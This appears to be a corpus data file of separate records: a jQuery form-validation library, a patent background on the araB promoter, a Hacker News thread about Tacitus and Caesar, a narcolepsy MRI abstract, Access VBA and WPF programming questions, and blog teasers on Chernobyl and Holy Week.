{"text": "\ufeff/*!\n** Unobtrusive validation support library for jQuery and jQuery Validate\n** Copyright (C) Microsoft Corporation. All rights reserved.\n*/\n\n/*jslint white: true, browser: true, onevar: true, undef: true, nomen: true, eqeqeq: true, plusplus: true, bitwise: true, regexp: true, newcap: true, immed: true, strict: false */\n/*global document: false, jQuery: false */\n\n(function ($) {\n    var $jQval = $.validator,\n        adapters,\n        data_validation = \"unobtrusiveValidation\";\n\n    function setValidationValues(options, ruleName, value) {\n        options.rules[ruleName] = value;\n        if (options.message) {\n            options.messages[ruleName] = options.message;\n        }\n    }\n\n    function splitAndTrim(value) {\n        return value.replace(/^\\s+|\\s+$/g, \"\").split(/\\s*,\\s*/g);\n    }\n\n    function escapeAttributeValue(value) {\n        // As mentioned on http://api.jquery.com/category/selectors/\n        return value.replace(/([!\"#$%&'()*+,./:;<=>?@\\[\\\\\\]^`{|}~])/g, \"\\\\$1\");\n    }\n\n    function getModelPrefix(fieldName) {\n        return fieldName.substr(0, fieldName.lastIndexOf(\".\") + 1);\n    }\n\n    function appendModelPrefix(value, prefix) {\n        if (value.indexOf(\"*.\") === 0) {\n            value = value.replace(\"*.\", prefix);\n        }\n        return value;\n    }\n\n    function onError(error, inputElement) {  // 'this' is the form element\n        var container = $(this).find(\"[data-valmsg-for='\" + escapeAttributeValue(inputElement[0].name) + \"']\"),\n            replace = $.parseJSON(container.attr(\"data-valmsg-replace\")) !== false;\n\n        container.removeClass(\"field-validation-valid\").addClass(\"field-validation-error\");\n        error.data(\"unobtrusiveContainer\", container);\n\n        if (replace) {\n            container.empty();\n            error.removeClass(\"input-validation-error\").appendTo(container);\n        }\n        else {\n            error.hide();\n        }\n    }\n\n    function onErrors(event, validator) {  // 'this' is the form element\n        var container = $(this).find(\"[data-valmsg-summary=true]\"),\n            list = container.find(\"ul\");\n\n        if (list && list.length && validator.errorList.length) {\n            list.empty();\n            container.addClass(\"validation-summary-errors\").removeClass(\"validation-summary-valid\");\n\n            $.each(validator.errorList, function () {\n                $(\"<li />\").html(this.message).appendTo(list);\n            });\n        }\n    }\n\n    function onSuccess(error) {  // 'this' is the form element\n        var container = error.data(\"unobtrusiveContainer\"),\n            replace = $.parseJSON(container.attr(\"data-valmsg-replace\"));\n\n        if (container) {\n            container.addClass(\"field-validation-valid\").removeClass(\"field-validation-error\");\n            error.removeData(\"unobtrusiveContainer\");\n\n            if (replace) {\n                container.empty();\n            }\n        }\n    }\n\n    function onReset(event) {  // 'this' is the form element\n        var $form = $(this);\n        $form.data(\"validator\").resetForm();\n        $form.find(\".validation-summary-errors\")\n            .addClass(\"validation-summary-valid\")\n            .removeClass(\"validation-summary-errors\");\n        $form.find(\".field-validation-error\")\n            .addClass(\"field-validation-valid\")\n            .removeClass(\"field-validation-error\")\n            .removeData(\"unobtrusiveContainer\")\n            .find(\">*\")  // If we were using valmsg-replace, get the underlying error\n                .removeData(\"unobtrusiveContainer\");\n    }\n\n    function validationInfo(form) {\n        var $form = $(form),\n            result = $form.data(data_validation),\n            onResetProxy = $.proxy(onReset, form);\n\n        if (!result) {\n            result = {\n                options: {  // options structure passed to jQuery Validate's validate() method\n                    errorClass: \"input-validation-error\",\n                    errorElement: \"span\",\n                    errorPlacement: $.proxy(onError, form),\n                    invalidHandler: $.proxy(onErrors, form),\n                    messages: {},\n                    rules: {},\n                    success: $.proxy(onSuccess, form)\n                },\n                attachValidation: function () {\n                    $form\n                        .unbind(\"reset.\" + data_validation, onResetProxy)\n                        .bind(\"reset.\" + data_validation, onResetProxy)\n                        .validate(this.options);\n                },\n                validate: function () {  // a validation function that is called by unobtrusive Ajax\n                    $form.validate();\n                    return $form.valid();\n                }\n            };\n            $form.data(data_validation, result);\n        }\n\n        return result;\n    }\n\n    $jQval.unobtrusive = {\n        adapters: [],\n\n        parseElement: function (element, skipAttach) {\n            /// <summary>\n            /// Parses a single HTML element for unobtrusive validation attributes.\n            /// </summary>\n            /// <param name=\"element\" domElement=\"true\">The HTML element to be parsed.</param>\n            /// <param name=\"skipAttach\" type=\"Boolean\">[Optional] true to skip attaching the\n            /// validation to the form. If parsing just this single element, you should specify true.\n            /// If parsing several elements, you should specify false, and manually attach the validation\n            /// to the form when you are finished. The default is false.</param>\n            var $element = $(element),\n                form = $element.parents(\"form\")[0],\n                valInfo, rules, messages;\n\n            if (!form) {  // Cannot do client-side validation without a form\n                return;\n            }\n\n            valInfo = validationInfo(form);\n            valInfo.options.rules[element.name] = rules = {};\n            valInfo.options.messages[element.name] = messages = {};\n\n            $.each(this.adapters, function () {\n                var prefix = \"data-val-\" + this.name,\n                    message = $element.attr(prefix),\n                    paramValues = {};\n\n                if (message !== undefined) {  // Compare against undefined, because an empty message is legal (and falsy)\n                    prefix += \"-\";\n\n                    $.each(this.params, function () {\n                        paramValues[this] = $element.attr(prefix + this);\n                    });\n\n                    this.adapt({\n                        element: element,\n                        form: form,\n                        message: message,\n                        params: paramValues,\n                        rules: rules,\n                        messages: messages\n                    });\n                }\n            });\n\n            $.extend(rules, { \"__dummy__\": true });\n\n            if (!skipAttach) {\n                valInfo.attachValidation();\n            }\n        },\n\n        parse: function (selector) {\n            /// <summary>\n            /// Parses all the HTML elements in the specified selector. It looks for input elements decorated\n            /// with the [data-val=true] attribute value and enables validation according to the data-val-*\n            /// attribute values.\n            /// </summary>\n            /// <param name=\"selector\" type=\"String\">Any valid jQuery selector.</param>\n            var $forms = $(selector)\n                .parents(\"form\")\n                .andSelf()\n                .add($(selector).find(\"form\"))\n                .filter(\"form\");\n\n            $(selector).find(\":input[data-val=true]\").each(function () {\n                $jQval.unobtrusive.parseElement(this, true);\n            });\n\n            $forms.each(function () {\n                var info = validationInfo(this);\n                if (info) {\n                    info.attachValidation();\n                }\n            });\n        }\n    };\n\n    adapters = $jQval.unobtrusive.adapters;\n\n    adapters.add = function (adapterName, params, fn) {\n        /// <summary>Adds a new adapter to convert unobtrusive HTML into a jQuery Validate validation.</summary>\n        /// <param name=\"adapterName\" type=\"String\">The name of the adapter to be added. This matches the name used\n        /// in the data-val-nnnn HTML attribute (where nnnn is the adapter name).</param>\n        /// <param name=\"params\" type=\"Array\" optional=\"true\">[Optional] An array of parameter names (strings) that will\n        /// be extracted from the data-val-nnnn-mmmm HTML attributes (where nnnn is the adapter name, and\n        /// mmmm is the parameter name).</param>\n        /// <param name=\"fn\" type=\"Function\">The function to call, which adapts the values from the HTML\n        /// attributes into jQuery Validate rules and/or messages.</param>\n        /// <returns type=\"jQuery.validator.unobtrusive.adapters\" />\n        if (!fn) {  // Called with no params, just a function\n            fn = params;\n            params = [];\n        }\n        this.push({ name: adapterName, params: params, adapt: fn });\n        return this;\n    };\n\n    adapters.addBool = function (adapterName, ruleName) {\n        /// <summary>Adds a new adapter to convert unobtrusive HTML into a jQuery Validate validation, where\n        /// the jQuery Validate validation rule has no parameter values.</summary>\n        /// <param name=\"adapterName\" type=\"String\">The name of the adapter to be added. This matches the name used\n        /// in the data-val-nnnn HTML attribute (where nnnn is the adapter name).</param>\n        /// <param name=\"ruleName\" type=\"String\" optional=\"true\">[Optional] The name of the jQuery Validate rule. If not provided, the value\n        /// of adapterName will be used instead.</param>\n        /// <returns type=\"jQuery.validator.unobtrusive.adapters\" />\n        return this.add(adapterName, function (options) {\n            setValidationValues(options, ruleName || adapterName, true);\n        });\n    };\n\n    adapters.addMinMax = function (adapterName, minRuleName, maxRuleName, minMaxRuleName, minAttribute, maxAttribute) {\n        /// <summary>Adds a new adapter to convert unobtrusive HTML into a jQuery Validate validation, where\n        /// the jQuery Validate validation has three potential rules (one for min-only, one for max-only, and\n        /// one for min-and-max). The HTML parameters are expected to be named -min and -max.</summary>\n        /// <param name=\"adapterName\" type=\"String\">The name of the adapter to be added. This matches the name used\n        /// in the data-val-nnnn HTML attribute (where nnnn is the adapter name).</param>\n        /// <param name=\"minRuleName\" type=\"String\">The name of the jQuery Validate rule to be used when you only\n        /// have a minimum value.</param>\n        /// <param name=\"maxRuleName\" type=\"String\">The name of the jQuery Validate rule to be used when you only\n        /// have a maximum value.</param>\n        /// <param name=\"minMaxRuleName\" type=\"String\">The name of the jQuery Validate rule to be used when you\n        /// have both a minimum and maximum value.</param>\n        /// <param name=\"minAttribute\" type=\"String\" optional=\"true\">[Optional] The name of the HTML attribute that\n        /// contains the minimum value. The default is \"min\".</param>\n        /// <param name=\"maxAttribute\" type=\"String\" optional=\"true\">[Optional] The name of the HTML attribute that\n        /// contains the maximum value. The default is \"max\".</param>\n        /// <returns type=\"jQuery.validator.unobtrusive.adapters\" />\n        return this.add(adapterName, [minAttribute || \"min\", maxAttribute || \"max\"], function (options) {\n            var min = options.params.min,\n                max = options.params.max;\n\n            if (min && max) {\n                setValidationValues(options, minMaxRuleName, [min, max]);\n            }\n            else if (min) {\n                setValidationValues(options, minRuleName, min);\n            }\n            else if (max) {\n                setValidationValues(options, maxRuleName, max);\n            }\n        });\n    };\n\n    adapters.addSingleVal = function (adapterName, attribute, ruleName) {\n        /// <summary>Adds a new adapter to convert unobtrusive HTML into a jQuery Validate validation, where\n        /// the jQuery Validate validation rule has a single value.</summary>\n        /// <param name=\"adapterName\" type=\"String\">The name of the adapter to be added. This matches the name used\n        /// in the data-val-nnnn HTML attribute(where nnnn is the adapter name).</param>\n        /// <param name=\"attribute\" type=\"String\">[Optional] The name of the HTML attribute that contains the value.\n        /// The default is \"val\".</param>\n        /// <param name=\"ruleName\" type=\"String\" optional=\"true\">[Optional] The name of the jQuery Validate rule. If not provided, the value\n        /// of adapterName will be used instead.</param>\n        /// <returns type=\"jQuery.validator.unobtrusive.adapters\" />\n        return this.add(adapterName, [attribute || \"val\"], function (options) {\n            setValidationValues(options, ruleName || adapterName, options.params[attribute]);\n        });\n    };\n\n    $jQval.addMethod(\"__dummy__\", function (value, element, params) {\n        return true;\n    });\n\n    $jQval.addMethod(\"regex\", function (value, element, params) {\n        var match;\n        if (this.optional(element)) {\n            return true;\n        }\n\n        match = new RegExp(params).exec(value);\n        return (match && (match.index === 0) && (match[0].length === value.length));\n    });\n\n    adapters.addSingleVal(\"accept\", \"exts\").addSingleVal(\"regex\", \"pattern\");\n    adapters.addBool(\"creditcard\").addBool(\"date\").addBool(\"digits\").addBool(\"email\").addBool(\"number\").addBool(\"url\");\n    adapters.addMinMax(\"length\", \"minlength\", \"maxlength\", \"rangelength\").addMinMax(\"range\", \"min\", \"max\", \"range\");\n    adapters.add(\"equalto\", [\"other\"], function (options) {\n        var prefix = getModelPrefix(options.element.name),\n            other = options.params.other,\n            fullOtherName = appendModelPrefix(other, prefix),\n            element = $(options.form).find(\":input[name='\" + escapeAttributeValue(fullOtherName) + \"']\")[0];\n\n        setValidationValues(options, \"equalTo\", element);\n    });\n    adapters.add(\"required\", function (options) {\n        // jQuery Validate equates \"required\" with \"mandatory\" for checkbox elements\n        if (options.element.tagName.toUpperCase() !== \"INPUT\" || options.element.type.toUpperCase() !== \"CHECKBOX\") {\n            setValidationValues(options, \"required\", true);\n        }\n    });\n    adapters.add(\"remote\", [\"url\", \"type\", \"additionalfields\"], function (options) {\n        var value = {\n            url: options.params.url,\n            type: options.params.type || \"GET\",\n            data: {}\n        },\n            prefix = getModelPrefix(options.element.name);\n\n        $.each(splitAndTrim(options.params.additionalfields || options.element.name), function (i, fieldName) {\n            var paramName = appendModelPrefix(fieldName, prefix);\n            value.data[paramName] = function () {\n                return $(options.form).find(\":input[name='\" + escapeAttributeValue(paramName) + \"']\").val();\n            };\n        });\n\n        setValidationValues(options, \"remote\", value);\n    });\n\n    $(function () {\n        $jQval.unobtrusive.parse(document);\n    });\n} (jQuery));", "meta": {"pile_set_name": "Github"}}
{"text": "Genetic information encoded in DNA molecules is expressed by a series of steps involving transcription of DNA into mRNA and the subsequent translation of the mRNA into polypeptides or proteins. The expression of the encoded information to form polypeptides is initiated at the promoter site, a region on the DNA molecule to which RNA polymerase binds and initiates transcription.\nRecombinant production of proteins and peptides has become a hallmark of the biomedical and industrial biochemical industry. One of the factors influencing the cost of commercial protein/peptide production is the efficient expression of the desired gene product. Factors influencing the efficiency of the process include, but are lot limited to gene dosage (i.e. copy number), promoter strength, and the ability to control expression (i.e. inducibility).\nHistorically, one means to increase protein production has been the use of multi-copy plasmids. However, the increased metabolic burden placed on the cell often results in a decreased growth rate and plasmid instability. As such, it is desirable to use a strong promoter so that the copy number is minimized. The use of a strong promoter facilitates increased protein production while minimizing the metabolic burden on the host cell (i.e. fewer copies of the gene targeted for expression are required to achieve the same level of protein yield).\nThe use of strong promoters often requires a level of control when expressing the desired gene product. Uncontrolled constitutive expression often results in undesirable effects on the growth and/or viability of the recombinant host cell. As such, the use of strong, inducible promoters is desired. Preferably, the promoter used is characterized by tightly regulated expression and is induced using a condition or compound that is safe, environmentally friendly, and economical.\nThe araB gene and its promoter (\u201caraB promoter\u201d also known as the PBAD promoter) are located in the L-arabinose operon. The endogenous L-arabinose operon has been studied in various microorganisms including, but not limited to Escherichia coli, Salmonella typhimurium, and Bacillus subtilis ((Horwitiz et al., Gene (1981) 14:309-319; Lin et al., Gene (1985) 34:111-122; Lin et al. Gene (1985) 34:123-128; Lin et al., Gene (1985) 34: 129-134); Schleif, R., Trends in Genet. (2000) 16(12):559-565; U.S. Pat. Nos. 5,028,530; and 6,030,807). The operon is comprised of 3 structural genes (araA, araB, and araD) encoding enzymes responsible for converting L-arabinose to D-xylose-5-phosphate. The gene araA encodes the enzyme arabinose isomerase, responsible for converting arabinose to ribulose. Ribulokinase (encoded by the gene araB) phosphorylates ribulose to make ribulose-5-phosphate. The enzyme ribulose-5-phosphate epimerase (encoded by the gene araD) converts ribulose-5-phosphate to xylulose-5-phosphate, which can be metabolized via the pentose phosphate pathway. The araBAD operon is coordinately controlled by the inducer L-arabinose and the AraC regulatory gene product (Guzman et al., (1995) J. Bacteriol. 177:4121-4130). PBAD based expression systems based are widely used and commercially available from companies such as Invitrogen (Carlsbad, Calif.).\nThe PBAD expression system is tightly controlled and the inducer, L-arabinose, is safe and economical. However, the wild type araB promoter is not generally considered a strong promoter once induced. As such, use of the currently available PBAD-based expression systems is often unattractive for low cost peptide/protein production where optimal protein yield is desired.\nThe problem to be solved is to provide an arabinose inducible expression system having the ability to increase protein yield when operably linked to a coding sequence of interest.", "meta": {"pile_set_name": "USPTO Backgrounds"}}
{"text": "\nTacitus\u2019 Perfect Man - diodorus\nhttp://www.historytoday.com/emma-southon/tacitus\u2019-perfect-man\n======\nvaluearb\nThis dragged me into quite a wonderful wikipedia sinkhole, which led me to\n\n[https://en.wikipedia.org/wiki/Caesarion](https://en.wikipedia.org/wiki/Caesarion)\n\nEveryone knows how amazing his father, Julius Caesar, was. But popular culture\nonly remembers on the legendary beauty of his mother. Cleopatra was almost\ncertainly a genius. She could speak 10 languages, and was the first Ptolemy\nruler to speak Egyptian (she was actually Greek/Macedonian, the Ptolemy\ndescended directly from Alexanders greatest general). She was educated in\nmath, philosophy and astronomy, introduced Julius Caesar to the astronomer\nSosigenes of Alexandria to help create the Julian calendar, and wrote a\nmedical treatise.\n\nSad that the product of two of histories great geniuses had to be killed by\nOctavian to protect his claim to the empire. Though the child seldom matches\ntheir parents, seems like an irreplaceable genetic loss.\n\nAfter Germanicus died, the Roman empire went from bad to worse in it's choice\nof emperors. Tiberius led to Caligula, then Claudius, then Nero, and his death\nlead to the tumultuous year of the Four emperors.\n\n[https://en.wikipedia.org/wiki/Year_of_the_Four_Emperors](https://en.wikipedia.org/wiki/Year_of_the_Four_Emperors)\n\nFrom that year comes interesting parallel to Germanicus, the story of Lucius\nVerginius Rufus.\n\n[https://en.wikipedia.org/wiki/Lucius_Verginius_Rufus](https://en.wikipedia.org/wiki/Lucius_Verginius_Rufus)\n\nHe helped put down uprisings by governors intending to become Emperor and\ntwice that year his armies offered to put him on the throne, and he refused\nboth times. In an era where emperors regularly killed anyone who had the\npolitical means to be a threat to their throne, he was able to live to the age\nof 83, where he was again selected as Consul by Emperor Nero.\n\n~~~\nSirensOfTitan\nSomething else to note here: Julius Caesar lived most of his life working\ntoward great purpose. It almost seemed like he got bored being in the same\nplace for too long. One of the only true times he took a break in his life was\nwith Cleopatra after the Pompean-Caesarian Civil War turned in his favor. It\nwas actually a bit of a disastrous hiatus for him, but I think it speaks to\nhow absolutely engaging Cleopatra was (although many commentators might just\nsay after 10 years of warfare, he just needed a break).\n\n> Sad that the product of two of histories great geniuses had to be killed by\n> Octavian to protect his claim to the empire. Though the child seldom matches\n> their parents, seems like an irreplaceable genetic loss.\n\nI think this statement jumps on the \"nature\" bandwagon, but I'd argue that at\nleast Caesar wasn't born a political and military genius, but got there by:\n\n1\\. Good tolerance of failure. Great Roman military commanders like Pompey and\nCaesar were known to have an uncanny ability to learn from their defeats.\n\n2\\. Luck. Certain decision making like going to Britain twice and making the\nsame mistake almost to his end played out well for Caesar. Also decisions to\nmarch to save his garrisoned legion during the greater Gallic rebellion during\nwintertime, while admirable (the safety of his soldiers was of supreme\nimportance to him), worked out where they seemed like they shouldn't most of\nthe time.\n\n3\\. Stupidity of his enemies. How many times did Caesar attack the Pompeans\nduring the Civil War during winter? They never learned. It's remarkable\nreally. One can also look at Caesar's merciful treatment of enemies during the\ncivil war as evidence of his genius -- he won so many by being gentle, even\nthough he had to fight Ahenobarbus like 4 times because he kept letting him\ngo.\n\nWith that, Caesar turned into an absolute master by making reasonable\ncalculated risks and surviving them. By the point he was clearing the last of\nthe Pompeans in Africa at the end of the Civil War, he didn't even leave his\ntent to give commands -- so confident and expertised in warfare that he didn't\neven have to see the field of battle.\n\nThis is a bit of a ramble. I really admire Julius Caesar and think there's so\nmuch to learn by studying his life and habits.\n\n~~~\nunFou\n\"By the point he was clearing the last of the Pompeans in Africa at the end of\nthe Civil War, he didn't even leave his tent to give commands\"\n\nWas this an indication of the experience and initiative of his commanders and\nnon-coms? So Caesar might decide on the overall approach, make sure all his\ncommanders knew what that was, and let them figure out how best to achieve\nthat based on the situation.\n\n~~~\nSirensOfTitan\n> Was this an indication of the experience and initiative of his commanders\n> and non-coms? So Caesar might decide on the overall approach, make sure all\n> his commanders knew what that was, and let them figure out how best to\n> achieve that based on the situation.\n\nThis interestingly largely didn't seem to be the case. By Africa most of\nCaesar's experienced legions (who campaigned with him during the Gallic Wars\nand the first half of the Civil War) weren't with him (he campaigned mostly\nwith Pompey's newly raised legions out of Greece). His commanders were either\nnew or of questionable skill. In particular, his most capable commander during\nthe Gallic Wars, Labienus, defected to the Pompey early in the Civil War, and\nwas one of Caesar's chief opponents during his African campaign.\n\nAs an interesting note, it seems Labienus likely defected from Caesar for two\nreasons:\n\n1\\. At the beginning of the Civil War it looked extremely unlikely Caesar\nwould win.\n\n2\\. Labienus felt as though Caesar took more credit than he ought to have in\nthe Gallic Wars, depriving him of his \"auctoritas\" (sort of prestige) he felt\nhe rightfully deserved.\n\nCaesar's skilled defeat of Pompey and Labienus show his military skill outside\nof his use of good commanders.\n\n~~~\nfapjacks\nI hope you see this after all this time. Do you have a trailhead to lend me so\nI can read about this instance of not having to leave his tent to give\ncommands? I have never heard this before and it's very interesting to me.\n\n------\nomalleyt\nIt's a symptom of postmodernism that nowhere in this text is it even suggested\nthat Tacitus is maybe just, you know, relating the facts about Germancius as\naccurately as he can.\n\nInstead we're sitting here quibbling over what literary fiction trope\n\"Tacitus's Germanicus\" fulfills in his \"story\"\n\n~~~\nbenbreen\nReading texts critically, thinking about the context that produced them, and\ndebating the author's rhetorical strategies has a lot more to do with\nRenaissance humanism than with postmodernism. Simply reading all historical\ntexts with the expectation that the author meant to tell the facts and nothing\nbut leads to the acceptance of frauds like the Donation of Constantine:\n\n[https://en.wikipedia.org/wiki/Donation_of_Constantine](https://en.wikipedia.org/wiki/Donation_of_Constantine)\n\n~~~\nomalleyt\nWell, it's not like I wholly disagree with what you're saying, but I think the\nparagraph above is a straw man of what I'm saying.\n\nFirst, here is the element of Postmodern discourse I'm talking about:\n\n[https://en.m.wikipedia.org/wiki/Deconstruction](https://en.m.wikipedia.org/wiki/Deconstruction)\n\nSecond, my complaint is that it's not even considered as a possibility that\nTacitus is telling the truth. In relation to The Annals (a public document\nconcerning public affairs thousands of contemporaries would have had firsthand\nexperiences of) do you really think it's a forgery? Or do you really think\nTacitus is so biased he can't record history accurately? The idea that someone\nbecomes so corrupted by their interests (especially race and class) that they\ncant be objective is a uniquely postmodern idea. The Enlightenment was\npremised on the idea that objective rationality was accessible to all.\n\nFurther, we can test your hypothesis about the Renaissance. The Renaissance\nwriters read Tacitus, and when they mention him, they treat his works like a\ncomplete and unmitigated factual account. Also, Tacitus is not engaged in\nrhetoric. That's the point. He's writing history, not philosophy.\n\n~~~\nswordswinger12\nYou're letting your modern biases color how you view Tacitus' writings. Most\npeople educated in the last ~hundred years or so were taught \"history\" as you\nunderstand it - an impartial account of the facts of an actual event or\nperson. This view of history is actually pretty recent, and it's widely\nunderstood that ancient historians did _not_ practice what we would consider\nthe modern discipline of history. For example, Herodotus is considered the\nhistorian ne plus ultra of the ancient world, but he still wrote about lots of\nweird shit like zombies and races of headless people.\n\nIt's not so much that modern historians think Tacitus was too \"biased\" to\n\"record history accurately\"; they read his works critically because they know\nhe wasn't really even trying to record history accurately in the way we think\nabout doing that today.\n\nEDIT: Another good example of ancient versus modern history is Pericles'\nFuneral Oration, as related to us by Thucydides:\n[https://en.wikipedia.org/wiki/Pericles%27_Funeral_Oration](https://en.wikipedia.org/wiki/Pericles%27_Funeral_Oration)\nThucydides probably edited the speech heavily (even by adding or removing\ncontent), and may have even combined multiple different speeches to create\nwhat we know as _the_ speech. A modern historian would most likely blanch at\nthe thought of doing this, but Thucydides was fine with it because he wasn't\neven trying to relay an impartial and 100% accurate account of the events of\nthe Peloponnesian War (as a modern historian would).\n\n~~~\nomalleyt\nHistorical records did not begin 100 years ago, that much I don't think anyone\ncan truly believe. We have detailed contemporary histories of the American\nRevolutionary War, for one, and they seem no more \"biased\" than histories of\nWWII.\n\nThere is a 500 year difference bt Herodotus and Tacitus. Even so, Herodotus\ndid no more than accurately record what he was told, assiduously pointing out\nwhen he saw something first hand. Early ancient historians made up speeches,\nthat much is known. But by Tacitus's day, the act of writing an objective\nhistory was not a novelty, and in fact he complains in the beginning of his\ntext that he is undertaking the work because he thinks his peers, also\nostensibly engaged in objective history, have not been objective enough out of\nfear or hatred when covering the reigns of Tiberius, Caligula, Claudius, and\nNero. Once again, with no reason to doubt him, I ask: why not even consider\ntaking one of the greatest historians whose works have been preserved for\nposterity at face value?\n\nIs there anything in particular Tacitus says in any of his works that you\ndoubt happened?\n\n", "meta": {"pile_set_name": "HackerNews"}}
{"text": "Hippocampal but not amygdalar volume loss in narcolepsy with cataplexy.\nNarcolepsy with cataplexy (NC) and narcolepsy without cataplexy (NwoC) are lifelong neurological disorders characterized primarily by excessive daytime sleepiness. Emotional events such as laughter are a trigger of cataplexy in NC. We compared the volumes of key limbic structures, the amygdala and hippocampus, in 53 NC, 23 NwoC and 37 control subjects. MRI volumetry was performed in FreeSurfer (FS) and by manual delineation. We found no differences in amygdalar volume in the three groups, however, hippocampal volume was significantly smaller in the NC group than in other groups. Amygdalar and hippocampal volumes assessed by FS were significantly greater, but strong positive correlation between manual and FS results were observed. Thus, both methods are suitable for amygdalar and hippocampal volumetry.", "meta": {"pile_set_name": "PubMed Abstracts"}}
{"text": "Q:\n\nBuilding a DCount/SQL statement in VBA via concetenation if test is true\n\nI have a data entry form (Access 2007) which is designed to find out if the captured animal already has an existing WHno.  Unfortunately, the data is messy and these is not a single unique identifier so several tests must be performed to narrow the search. \nThe animal could have 1 to 10 different pieces of information which will help identify the animal\u2019s existence in the database. (The script only tests for about half of them thus far) I was thinking the best way to do this would to be to \u201cbuild\u201d a DCount and/or SQL statement based on which fields the user selects. I hope test to see if a particular text field box (unbound) has been filled out, and if yes, concatenate that section of code to the DCount/SQL statement, then move on to the next text field box to test.\nOnce the statement has been completely built, I want to test to see how many records have been counted/selected. If one record has been selected, I want to display the results in FormA. If 2 or more records are found, I want to display the records in a multi-listing form (FormB) from which the user can select the correct animal based on additional information not tested but displayed in FormB. If zero records are found, I want to create a new record with the data entered into the form updated into the table.\nThe hurdle I am struggling with now is building the DCount statements. I keep getting syntax errors . I do not know how to put this together piecemeal when the function bombs out because the syntax is incomplete (which it will be until I finish \u201cbuilding\u201d it.)\nI know the data is a mess. The scene out in the field is chaotic, different people gather different kinds of information, and not all the data that should be entered on the paper forms get filled out completely - if at all. The data gathering procedures are unlikely to change anytime soon.\nIdeas? A different but easier approach idea is also welcome. New to this and not sure of all my programming options.\nAlso, how long can this statement be before it bombs out?\nCode so far:\nPrivate Sub GenerateWHno_Click()\nDim rs As DAO.Recordset\n\nIf IsNull(Forms!F_HotelEntry!txtSpecies) Or (Forms!F_HotelEntry!txtSpecies) = \"\" Then\n    MsgBox \"Species is a required field. Please enter a species\"\n    Exit Sub\n\nEnd If\n\nMsgBox txtSpecies\n\n' Each line of code below indicates a data entry field(s) that needs testing and appended to SpeciesCount if \"true\". The first line is unchanging and is declared upfront.\n\n'SpeciesCount = DCount(\"[Species]\", \"AnimalInfo\", \"(nz([Status])= '' OR [Status] = 'Alive' OR [Status] = 'Unknown') AND ([Species]= '\" & txtSpecies & \"')\" _\n'    & \"AND (((nz([L_ET_Color1])= '\" & Nz(txtL_ET_Color1) & \"' AND nz([L_ET_No1])= '\" & nz(txtL_ET_No1) & \"')\" _\n'    & \"AND (((nz([R_ET_Color1])= '\" & Nz(txtR_ET_Color1) & \"' AND nz([R_ET_No1])= '\" & nz(txtR_ET_No1) & \"')\" _\n'    & \"AND nz([L_ET_No2])= '\" & nz(txtL_ET_No2) & \"')\" _\n'    & \"AND nz([R_ET_No2])= '\" & nz(txtR_ET_No2) & \"')\" _\n'    & \"\")\n\n'If txtL_ET_Color Is Not Null Or txtL_ET_No Is Not Null Then\n    'LET1 = & \"AND (((nz([L_ET_Color1])= '\" & Nz(txtL_ET_Color1) & \"' AND nz([L_ET_No1])= '\" & nz(txtL_ET_No1) & \"')\" _\n    'Species Count = SpeciesCount & LET1\n'End If\n\n'If txtR_ET_Color Is Not Null Or txtR_ET_No Is Not Null Then\n    'RET1 = & \"AND (((nz([R_ET_Color1])= '\" & Nz(txtR_ET_Color1) & \"' AND nz([R_ET_No1])= '\" & nz(txtR_ET_No1) & \"')\" _\n    'Species Count = SpeciesCount & RET1\n'End If\n\n'If txtL_ET_No2 Is Not Null Then\n    'LET2 = AND nz([L_ET_No2])= '\" & nz(txtL_ET_No2) & \"')\" _\n'Species Count = SpeciesCount & LET2\n'End If\n\n'If txtR_ET_No2 Is Not Null Then\n    'RET2 = AND nz([R_ET_No2])= '\" & nz(txtR_ET_No2) & \"')\" _\n'Species Count = SpeciesCount & RET2\n'End If\n\n'There are about 4 more options/fields to add to the script but you get the idea.\n\n'Thus: If user selected Species, and filled out L_ET_Color1 and/or L_ET_No1, the final concatenation (DCount statement)would look like this:\nSpeciesCount = DCount(\"[Species]\", \"AnimalInfo\", \"([Status]= 'Alive' OR [Status] = 'Unknown' OR nz([Status]) = '') AND [Species]= '\" & txtSpecies & \"' AND (nz([L_ET_Color1])= '\" & Nz(txtL_ET_Color1) & \"' AND nz([L_ET_No1])= '\" & Nz(txtL_ET_No1) & \"')\")\n\n    If SpeciesCount > 1 Then\n        MsgBox SpeciesCount & \" Greater than 1. Please select correct animal\"\n        'Create SQL statement that mimics DCount statement and display all fields from AnimalInfo table as multilisting to select from\n\n    ElseIf SpeciesCount = 0 Then\n        MsgBox \"You need a new WHno\"\n\n        WHno = Nz(DMax(\"WHno\", \"AnimalInfo\")) + 1\n        MsgBox WHno\n\n        Set rs = CurrentDb.OpenRecordset(\"AnimalInfo\")\n            rs.AddNew\n            rs!WHno = WHno\n            rs!Species = txtSpecies\n            rs!L_ET_Color1 = txtL_ET_Color1\n            rs!L_ET_No1 = txtL_ET_No1\n            rs.Update\n            rs.Close\n    Else\n        'Create SQL statement that mimics DCount statement and display all fields from AnimalInfo table as single listing in a form.\n        MsgBox \"You're WHno is \" & WHno & \" Is this the correct WHno?\"\n    End If\n    Forms!F_HotelEntry!txtSpecies = \"\"\n    Forms!F_HotelEntry!txtL_ET_Color1 = \"\"\n    Forms!F_HotelEntry!txtL_ET_No1 = \"\"\nEnd Sub\n\nA:\n\nI would suggest to first compose the condition into a string variable. There you can print its content via Debug.Print and see what the problem might be.\nIf you cannot spot the problem via inspection alone, paste the generated string to the Sql view of a proper query and see if Access gives you helpful information on switching to design view.\n\n", "meta": {"pile_set_name": "StackExchange"}}
{"text": "Q:\n\nHow load data in datagrid in WPF Application\n\nIn WinForms i do this:\nvar fromtable = from a in Table1 select a;\nDataGridView.DataSource = fromtable;\n\nAnd i see data. How make same in wpf application?\nIf i do like this: \nMuseum_TrueEntities me = new Museum_TrueEntities();\n var test = from a in me.Authors select a;\n dataGrid1.ItemsSource = test;\n\nIn result DataGrid is empty.\n\nA:\n\ndont forget to set AutogenerateColumns=true in your datagrid.\nif you create the columns by your self post some xaml and set the correct binding.\n\n", "meta": {"pile_set_name": "StackExchange"}}
{"text": "What do you think: is nuclear power friend or foe? What are your reasons for coming to this conclusion? 25 years ago today (April 26, 1986) was the world\u2019s worst nuclear power accident, in Chernobyl, Ukraine. A wasteland still today, Chernobyl evacuated 336,000 people, saw the direct death of 56 people, and a 2009 study [\u2026]\n[Read More]\n\nSiphoning attention to the Easter bunny is not the only way we escape Jesus during Holy Week. We adults are much more sophisticated. We elude Jesus humanity via the warm glow of theology itself.\n[Read More]", "meta": {"pile_set_name": "Pile-CC"}}
